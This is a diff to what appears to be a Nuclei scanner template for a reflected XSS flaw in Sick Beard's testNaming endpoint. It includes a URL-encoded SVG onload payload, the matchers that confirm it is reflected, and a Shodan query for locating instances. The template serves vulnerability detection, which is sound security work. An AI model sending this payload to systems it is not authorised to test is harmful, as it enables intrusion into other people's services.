@@ -1,18 +1,20 @@
-id: Sick Beard XSS
-
-# Vendor Homepage: https://sickbeard.com/
-# Software Link: https://github.com/midgetspy/Sick-Beard
-# shodan dork: sickbeard
+id: sick-beard-xss
 
 info:
-  name: Sick Beard XSS 
+  name: Sick Beard XSS
   author: pikpikcu
   severity: medium
+  tags: xss
+  reference:
+    - https://sickbeard.com/ # vendor homepage
+    - https://github.com/midgetspy/Sick-Beard # software link
+  metadata:
+    shodan-query: sickbeard
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=<svg/onload=alert('xss')>"
+      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E"
     matchers-condition: and
     matchers:
       - type: status
@@ -20,5 +22,9 @@ requests:
           - 200
       - type: word
         words:
-          - "<svg/onload=alert('xss')>"
+          - <svg/onload=alert(document.domain)>
         part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
